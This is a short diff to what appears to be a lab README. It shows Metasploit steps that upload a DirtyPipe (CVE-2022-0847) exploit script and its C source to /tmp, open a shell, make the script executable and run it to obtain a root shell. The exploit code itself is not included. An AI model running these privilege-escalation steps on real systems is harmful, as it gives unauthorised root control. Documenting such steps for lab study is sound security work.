@@ -26,8 +26,12 @@ docker exec -it k1 msfconsole -r MsfAutoExploit.rc
 upload dirtypipe.sh /tmp
 upload CVE-2022-0847.c /tmp
 
+# Drop into shell
+shell
+# Set execute permission 
+chmod +x /tmp/dirtypipe.sh
 # Execute dirtypipe.sh to get root shell
-execute -f ./tmp/dirtypipe.sh -i -H
+cd /tmp && ./dirtypipe.sh
 ```
 
 # Discovery
